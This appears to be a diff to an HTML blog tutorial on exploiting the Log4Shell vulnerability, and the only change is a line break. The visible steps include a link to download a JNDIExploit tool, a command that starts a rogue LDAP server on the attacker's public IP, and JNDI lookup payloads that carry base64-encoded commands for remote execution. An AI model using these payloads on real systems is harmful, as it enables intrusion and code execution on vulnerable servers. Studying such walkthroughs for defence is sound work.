@@ -306,7 +306,7 @@ ${jndi:ldap://${main:bar}.domain.com/j}
 2. Now download this zip file in your instance and unzip it.<a href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip">Here</a><br><br>
 3. Start the LDAP server<br><br>
     <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code><br><br>
-4. We just need to inject the payload.<code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br><br>
+4. We just need to inject the payload.<br><code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br><br>
 5. we’ll encode our command in base64:<br><br>  
    <img src="img/blog/step4.jpg" class="img-fluid" alt="step4"/> <br>
 6. You can see the hit like below:<pre><code>
